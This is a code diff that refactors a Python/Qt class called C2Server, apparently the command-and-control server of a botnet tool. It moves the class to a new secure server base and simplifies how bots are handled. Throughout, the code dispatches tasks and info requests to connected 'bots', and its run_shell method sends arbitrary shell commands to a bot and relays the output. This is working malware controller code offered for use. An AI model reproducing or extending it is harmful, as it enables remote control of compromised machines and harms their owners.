@@ -3,40 +3,31 @@ import logging
 import datetime
 
 from qtpy.QtCore import Slot, Signal
-from QtPyNetwork.server import QBalancedServer
 
-from core.crypto import generate_key
-from models import Bot, Task, Info
+from models import Bot, Task, Info, Device
+from core.Network.SecureServer import SecureBalancedServer
 
 
-class C2Server(QBalancedServer):
+class C2Server(SecureBalancedServer):
     """C2 server."""
 
     task = Signal(Task)
     info = Signal(Info)
-    assigned = Signal(int, str, int)
 
-    shell_error = Signal(int, str)
-    shell_output = Signal(int, str)
+    shell_error = Signal(Bot, str)
+    shell_output = Signal(Bot, str)
 
     def __init__(self):
-        super(C2Server, self).__init__(loggerName=self.__class__.__name__)
-        self.setDeviceModel(Bot)
+        super(C2Server, self).__init__()
+        self.set_device_model(Bot)
         self.setObjectName("C2Server")
         self.logger = logging.getLogger(self.__class__.__name__)
-
-        self.connected.connect(self.pre_connection)
         self.error.connect(self.logger.error)
 
     @Slot(Bot, bytes)
     def on_message(self, bot: Bot, message: bytes):
         """When server receives message from bot."""
-        try:
-            bot = self.getDeviceById(bot_id)
-            bot_id = bot.get_id()
-        except Exception as e:
-            self.logger.error("Could not find bot with ID {}: {}".format(bot_id, e))
-            return
+        message = super().on_message(bot, message)
 
         event_type = message.get("event_type")
         if event_type == "task":
@@ -55,84 +46,44 @@ class C2Server(QBalancedServer):
                     return
                 self.task.emit(task)
             else:
-                self.logger.error("Could not find task with ID {} for bot {}".format(task_id, bot_id))
+                self.logger.error("Could not find task with ID {} for bot {}".format(task_id, bot.id()))
 
         elif event_type == "info":
-            event = Info(bot_id,
+            event = Info(bot.id(),
                          message.get("info"),
                          message.get("results"))
             bot.on_info_received(event)
             self.info.emit(event)
 
-        elif event_type == "assign":
-            key = message.get("encryption_key")
-            if bot.is_connected():
-                self.logger.warning("Bot {} tried to renegotiate encryption key. Kicked!".format(bot_id))
-                self.kick(bot_id)
-
-            if key == bot.key:
-                key = str(key).encode()
-                self.setCustomKeyForClient(bot_id, key)
-                bot.set_connected(True)
-                self.assigned.emit(bot_id, bot.ip, bot.port)
-            else:
-                self.logger.warning("Assigned keys do not match! Bot {} will be kicked!".format(bot_id))
-                self.kick(bot_id)
-
         elif event_type == "shell":
             event = message.get("event")
             if event == "error":
-                self.shell_error.emit(bot_id, message.get("error"))
+                self.shell_error.emit(bot, message.get("error"))
             elif event == "output":
-                self.shell_output.emit(bot_id, str(message.get("output")))
+                self.shell_output.emit(bot, str(message.get("output")))
 
         else:
-            self.logger.error("BOT-{}: Failed to find matching event type for {}".format(bot.get_id(), message))
-        self.message.emit(bot_id, message)
-
-    @Slot(int, str, int)
-    def pre_connection(self, bot_id, ip, port):
-        key = generate_key().decode()
-        self.getDeviceById(bot_id).set_custom_key(key)
-        self.write(bot_id, {"event_type": "assign", "encryption_key": key})
+            self.logger.error("BOT-{}: Failed to find matching event type for {}".format(bot.id(), message))
+        self.message.emit(bot, message)
 
     @Slot(int, str, dict, int)
     def send_task(self, bot_id: int, task: str, kwargs: dict, user_activity: int):
         """Send task."""
-        if bot_id == 0:
-            for bot in self.getDevices():
-                bot_id = bot.get_id()
-                task_id = bot.get_next_task_id()
-                task_obj = Task(bot_id, task_id, task, kwargs)
-                task_obj.user_activity = user_activity
-                bot.on_task_received(task_obj)
-                task_dict = task_obj.create()
-                task_dict["event"] = "start"
-                self.write(bot_id, task_dict)
-                self.task.emit(task_obj)
-        else:
-            bot = self.getDeviceById(bot_id)
-            if bot:
-                task_id = bot.get_next_task_id()
-                task_obj = Task(bot_id, task_id, task, kwargs)
-                bot.on_task_received(task_obj)
-                task_dict = task_obj.serialize()
-                task_dict["event"] = "start"
-                self.write(bot_id, task_dict)
-                self.task.emit(task_obj)
-            else:
-                self.logger.error("BOT-{} not found".format(bot_id))
+        bot = self.get_device_by_id(bot_id)
+        task_id = bot.get_next_task_id()
+        task_obj = Task(bot.id(), task_id, task, kwargs)
+        bot.on_task_received(task_obj)
+        task_dict = task_obj.serialize()
+        task_dict["event"] = "start"
+        bot.write(task_dict)
+        self.task.emit(task_obj)
 
-    @Slot(int, list)
-    def send_info(self, bot_id: int, info: list):
+    @Slot(Bot, list)
+    def send_info(self, bot: Bot, info: list):
         """Send info request."""
-        bot = self.getDeviceById(bot_id)
-        info_obj = Info(bot_id, info)
+        info_obj = Info(bot.id(), info)
         bot.on_info_received(info_obj)
-        if bot_id == 0:
-            self.writeAll(info_obj.create())
-        else:
-            bot.write(info_obj.create())
+        bot.write(info_obj.create())
 
     @Slot(int, int)
     def force_start_task(self, bot_id, task_id):
@@ -144,6 +95,7 @@ class C2Server(QBalancedServer):
 
     @Slot(int, str)
     def run_shell(self, bot_id, command):
+        bot: Device = self.get_device_by_id(bot_id)
         try:
             if not command:
                 raise Exception("command cannot be an empty string")
@@ -151,6 +103,6 @@ class C2Server(QBalancedServer):
             args = []
             if len(command) > 1:
                 args = command[1:]
-            self.write(bot_id, {"event_type": "shell", "event": "run", "command": command[0], "args": args})
+            bot.write({"event_type": "shell", "event": "run", "command": command[0], "args": args})
         except Exception as e:
             self.shell_error.emit(bot_id, "Failed to execute command {}: {}".format(command, e))
